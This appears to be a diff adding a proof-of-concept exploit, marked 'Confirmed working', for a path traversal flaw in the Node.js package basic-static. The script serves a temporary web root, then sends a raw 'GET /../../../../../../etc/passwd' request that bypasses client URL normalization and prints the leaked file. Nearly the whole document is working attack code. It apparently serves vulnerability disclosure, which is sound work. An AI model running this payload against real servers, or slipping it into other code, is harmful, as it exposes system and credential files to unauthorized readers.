@@ -1,0 +1,39 @@
+Confirmed working.
+
+```javascript
+'use strict';
+
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const net = require('net');
+const http = require('http');
+const basicStatic = require('./node_modules/basic-static');
+
+// Public web root that is supposed to be the only thing served.
+const rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'public-'));
+fs.writeFileSync(path.join(rootDir, 'index.html'), 'hello world');
+
+const server = http.createServer(basicStatic({ rootDir }));
+
+server.listen(0, () => {
+  const port = server.address().port;
+  const sock = net.connect(port, '127.0.0.1', () => {
+    // The raw request line bypasses any client-side URL normalization,
+    // so basicStatic's serveFile() -> stream() sink receives the
+    // untouched "../" sequences and streams a file outside rootDir.
+    sock.write(
+      'GET /../../../../../../etc/passwd HTTP/1.1\r\n' +
+      'Host: localhost\r\n' +
+      'Connection: close\r\n\r\n'
+    );
+  });
+
+  let data = '';
+  sock.on('data', (chunk) => { data += chunk; });
+  sock.on('end', () => {
+    console.log(data);
+    server.close();
+  });
+});
+```
